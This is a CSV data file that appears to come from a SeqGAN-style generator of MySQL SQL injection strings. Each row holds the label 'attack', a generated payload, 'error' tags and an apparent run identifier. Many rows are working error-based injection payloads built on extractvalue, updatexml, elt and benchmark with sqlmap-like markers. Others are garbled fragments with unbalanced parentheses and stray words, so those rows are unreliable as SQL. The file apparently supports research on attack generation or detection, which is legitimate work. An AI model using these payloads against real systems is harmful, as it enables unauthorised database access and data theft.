attack,"1"" and extractvalue  (  (  (  (  (  1808,concat  (  select   (  elt a  0x5c)  )   (  (  elt  (  elt    (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  0x5c,  (  benchmark  (  select   (  8868  )  (  elta  elt  (  1808  =  3393,0x7171706a71,  (  (  select   (  elt  (  elt  (  1808  =  (  0x2e,0x7171706a71,  (  =  (  9627,concat  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1170
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""eikhkhrcelq"" like ""y""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1171
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zhzxwmsnvgzq"" like ""ylyse  (  select   (  l  =  (  (  3393  =  9627,md5  (  1808  =  (  0x5c,0x7171706a71,  (  (  5000000(  (  0x2e,md5  (  =  (  =  (  1297,concat  (  (  0x5c,0x7171706a71,  (  9627,md5  (  (  0x2e,0x7171706a71,  (  selectt=  (   (   (  9393   (  (  elt  (  elt  (  1297  =  (  3393,  (  (  select   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1172
attack,"1%k""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1173
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1174
attack,"1%""   )    AND proreedu   (na  )  eq(  (    (  (  (  select   (  8862   (  5433  (  2917  =  (  (  3393,1   )    (  extractvalue  (  9627,1   (  case else updatexml  (  (  1808,1 else cast  (  (  =  (  (  1808  =  (  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  select   (  el  (  0x2e,0x7171706a71,  (  (  5000000,md5  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1175
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1176
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1177
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '(updatexml  (  33936212  )   (  Y  (  (  select   (  elt  (  1808  =  (  (  7982=  (  (  1808  (  (  0x5c,  (  5000000(  (  0x2e,0x7171706a71,  (  (  5000000(  (tselect 0 0 d 0 0 from d5  (  elt  elt  1297  (  (  (  0x5c,  (  5000000,md5  (  =  (  (  1808  =  4774  (  select   (  elt  (  elt  (  1808  =  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1178
attack,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1179
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1180
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1181
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1182
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1183
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1184
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1185
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1186
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1187
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1188
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1189
attack,"1 and updatexml  (  (  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,  (  5000000(  (  (  (  (  (  (  0x5c,0x7171706a71,  (  (  (  (  5000000,m(  (  (  benchmark  (  (  (  5000000(  (  =  7982  (  (  (  0x5c,m(  (  benchmark  (  (  5000000  (  (  0x2e,md5  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  (  (  0x2e,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1190
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%qwhere and gznqmixFROM bnanance  (  1049  (  0x2e,  (  (  (  select   (  elt  (  1297  =  1 0 from d6166  (  SELECT from d5  4660  (   from dual  )  el  )   end  (  5530  (  (  case when   (  4415  (  (  0x2e,0x7171706a71,  (  =  Q(  (  (  benchmark  (  benchmark  (  benchmark  (  1297,concat  (  (  (  (  3393  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1191
attack,1%'  =  ''  =  'nn pr,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1192
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1193
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1194
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zls",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1195
attack,"  )  select   (  8841  =  (  (  7982  =  extractvalue  (  (  9627,concat  (  select   (  (  elt  (  elt  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  e  (  (  1808  =  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  select   (  2914  =    (  1808,concat  (  (  (  (  0x2e,0x7171706a71,  (  =  (  9627,concat  (  (  (  (  0x2e,1   )    (  extractvalue  (  3393,1   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1196
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1197
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1198
attack,"1%""   )    (  extractvalue  1559   (  8318  =  (  5000000(  7529  0x4b774c75   (  2914  (  3393  =  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (  0x5c,0x7171706a71,  (  (  (  (    (  benchmark  (  (  (  select   (  elt  (  elte  (  0x5c,0x7171706a71,  (  benchmark  (  5000000(  0x2e,0x7171706a71,  (  select   (  elt  (  9490  =  (  0x2e,  (  5000000(  0x5c,  (  (  select,0x7171706a71(  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1199
attack,"1%'   )    )    AND wbys.anhose   (  (  (  elt  (  elt  (  5000000,md5  (  (  0x5c,0x7171706a71,0x717a767a71  (  (  caset  =  DUAAwhene  (  (  (  select   (  elt  (  1297  =  (  (  0x5c,0x7171706a71,md5  (  (  0x2e,0x7171706a71,  (  (  1759(  (  0x5c,0x7171706a71,  (  (  5000000,md5  (  3393,  (  (  /  (  select   (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1200
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1201
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1202
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  'y'  =  'yns",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1203
attack,"1%""   )    (  9103  (  extractvalue  (  (  2917,concat  =  (  (  1297,concat  (  3393,0  (  (  =  (  1297,1   (  extractvalue  (  9627,concat  (  (  0x2e,md5  (  (  0x5c,0x7171706a71,  (  benchmark  (  benchmark  (  (  benchmark  (  (  benchmark  (  (  benchmark  (  e  (  (  0x2e,0x7171706a71,  (  select   (  7982  =  ut  a  )   (  9490  (  7982,concat  (  (  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1204
attack,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1205
attack,"1 pprodhresdu9788fdreanel  el  (  7982  (  1808,1   )    (  extractvalue  (  9627,1   (  )  case from extractvalue  (  (  (  0x5c,  (  benchmark  (  (  benchmark  (  9255,concat  (  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  1049  =  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  e  (  5000000,md50x7171706a71,  (  =  9627,md5  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1206
attack,"1%""  )  )   from dual  )   end  (  (  elt  (  8862 when   (  (  elt  (  1808  =  3393,  (  (  9490  =    (  (  select   (  elt  (  el  (  7982  =  (  0x2e,0x7171706a71,  (  =  (  2826  (  9627,concat  (  =  (  (  (  0x5c,0x7171706a71,  (  (  (  select   (  5704  =  8768  (  elt  (  case  =  (  1 as du doan",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1207
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1208
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1209
attack,1%jk'  =  'xpphf,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1210
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1211
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1212
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%jbj",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1213
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1214
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1215
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1216
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'orkhuh' like 'kunn",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1217
attack," AND else 0 from d ual  )  elydue  )  elt  (  elt  (  2917  =  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  5000000(  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  1808  =  1808,1   from d 0 from a  (  1724  (  elt  elt  (  3393  =    (  (  (  0x5c,  (  (  (  select   (  elt  (  (  (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1218
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1219
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1220
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1221
attack,"1   )    (  select,0x7171706a71(  (  (  (  select   (   (  (  8375  =  (  1297,1   )    (  extractvalue  (  1297,concat  (  (  =  (  (  (  0x2e,md5  (  (  benchmark  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  7982  =  (  (  3393  (  (  1808  =  (  1808,concat  (  (  3393  (  (  3393  =  (  (  3393,m,  (  5000000,md5  (  (  (  1808  =  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1222
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1223
attack,"1%R' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""Uifkkj--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1224
attack,"1%""   )    AND and extractvalue  (  (  (  (  3393,concat  (  (  0x2e,concat  (  (  0x5c,0x7171706a71,  (  (  5000000,m(  (  (  5000000,md5  (  =  (  9788,1   (  extractvalue  (  9627,md5  (  =  (  1808,concat  (  (  (  0x4b774c75   (  4415  (  (  (  3393  =  (  3393,md5  =  (  2917,concat  (  (  (  3393,  (  (  (  5000000,md5  (  7982  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1225
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1226
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1227
attack,1%pk,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1228
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1229
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1230
attack,"1%""   )    AND procedure analyse  (  elt  case  )    =  (  1808,1   )    (  extractvalue  (  (  2917,concat  (  (  0x5c,0x7171706a71,  (  t  (  (  5000000,md5  (  (  (  (  1808  =  1   (  8375  (  select   (  5322  (  ut  elt  (  7982  =  (  (  0x5c,  (  benchmark  (  (  benchmark  (  (  5000000(  (  1808,1   (  updatexml  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1231
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1232
attack,"1%""   )    )     extractvalue  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  7982  =  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  9788  =  (  0x2e,0x7171706a71,0  (  (  (  benchmark  (  9255,1    ,8666  UST  (  Ut   )    (  select   (  case 0 from dua  elt  (  el  (  1808  =  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1233
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1234
attack,"1 where updatexml  (  (  (  (  (  (  7706  (  (   (  3576  (  (   (  (   (  4774  (  3863  =  ut  (  eltal  )  7982  =  6212  (  5777  =  (  2518  )   (  (  )  elt  (  7982  =  (  (  select   (  elt  (  elt  (  1297  =  (  3393,  (  (  select   (  elt  (  1808  =  (  1808,,select   (  2501,  (  (  0x2e,8666  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1235
attack,"1%""   )    )     extractvalue  (  }1808,concat  (  (  0x2e,concat  (  =  (  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  select   (  5000000,md5  (  8862  (  0x2e,0x7171706a71,  (  5000000(  (  (  0x4b774c75   (  (  elt  (  elt  (  1297  =  5603  (  (  0x5c,  (  select   (  el  9788  =  (  (  1808,concat  (  =  (  0x5c,  (  (  select   (  elt  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1236
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1237
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1238
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'e%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1239
attack,"1# AND bnal  )  /  (  =  (  (  0x2e,md5  (  (  (  select   (  elt  (  elt  (  1808  =  3393,  (  (  benchmark  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  select   (  elt  (  casea   end  (  (   (  9393  (  (  elt    (  (  (  0x5c,0x7171706a71,  (  (  select   (  (  elta  elt  (  1808  =  (  (  3393  =  0x7171706a71(",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1240
attack,"1%k8277""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1241
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1242
attack,"1%""   )    )     extractvalue  (  (  9627,concat  (  (  (  (  (  (  (  (  =  (  (  (  (  (  2917  (  (  0x5c,  (  0x5c,0x7171706a71,md5  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  1297  =  (  3393,1   )    (  extractvalue  (  9627,md5  =  (  (  7982  =  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000(  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1243
attack,1%%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1244
attack,"1%""   )    (  extractvalue  (  9627,md5  (  (  0x5c,0x7171706a71,  (  select   (  (  el  (  case  =  4688  (  1808,concat  (  (  (  (  0x5c,  (  (  select   (  (  e    (  case   ual adonadede   (  3681  (  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x4b774c75   end  (  =  (  5433  =  3393,1   )    )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1245
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1246
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1247
attack,"select   (  )  case when   (  9103  =  4774  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  6212  (  1297,1   or  extractvalue  (  (  9627  =  (  benchmark  (  3393,1   )    (  extractvalue  (  (  9255,concat  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  5000000(  (  select   (  elt  (  2162  )  1808  =  (  (  1 as anal  )  1808  =  (  3393,1",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1248
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1249
attack,"1%1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1250
